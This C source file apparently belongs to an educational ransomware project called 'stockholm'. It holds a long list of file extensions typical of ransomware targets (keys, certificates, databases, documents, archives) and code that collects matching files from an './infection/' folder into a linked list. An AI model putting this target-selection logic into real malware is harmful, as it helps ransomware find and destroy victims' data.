#include "stockholm.h"

/*
*	Simple parsing function
*/

const char *extensions[] = {
	".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
	".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
	".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
	".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
	".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
	".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1",
	".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",
	".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg",
	".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv",
	".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff",
	".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso",
	".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2",
	".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti",
	".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123",
	".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst",
	".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt",
	".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls",
	".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc", 0
};

int	valid_extension(char *file)
{
	int	ext = strlen(file);
	while (ext != 0 && file[ext] != '.')
		ext--;
	if (ext == 0)
		return (1);
	for (int i = 0; extensions[i]; i++)
		if (strcmp(extensions[i], file + ext) == 0)
			return (1);
	// printf("ext : %s\n", file + ext);
	return (0);
}

struct linkedFile	*openFile(void)
{
	DIR *dr;
	struct dirent *en;
	dr = opendir("./infection/"); //open all directory
	if (dr == 0)
		return NULL;
	struct linkedFile *node = NULL;
	while ((en = readdir(dr)) != NULL) {
		if (strlen(en->d_name) > 2 && valid_extension(en->d_name))
			addback_node(&node, en->d_name);
	}
	closedir(dr); //close all directory
	return node;
}


/*
*	Linked list funtion
*/

void	clearlist(struct linkedFile **toclear)
{
	if (toclear == 0)
		return ;
	struct linkedFile *savef;
	while (*toclear)
	{
		savef = *toclear;
		*toclear = (*toclear)->next;
		free(savef);
	}
}

void	addback_node(struct linkedFile **node, char filename[256])
{
	if (!filename)
		return ;
	if (!*node || !node)
	{
		(*node) = malloc(sizeof(struct linkedFile));
		strcpy((*node)->file, filename);
		(*node)->next = NULL;
		return ;
	}
	struct linkedFile *new = malloc(sizeof(struct linkedFile));
	if (new == 0)
		return ;
	strcpy(new->file, filename);
	new->next = NULL;
	struct linkedFile *fnode = *node;
	while ((*node)->next && *node)
		*node = (*node)->next;
	(*node)->next = new;
	*node = fnode;
}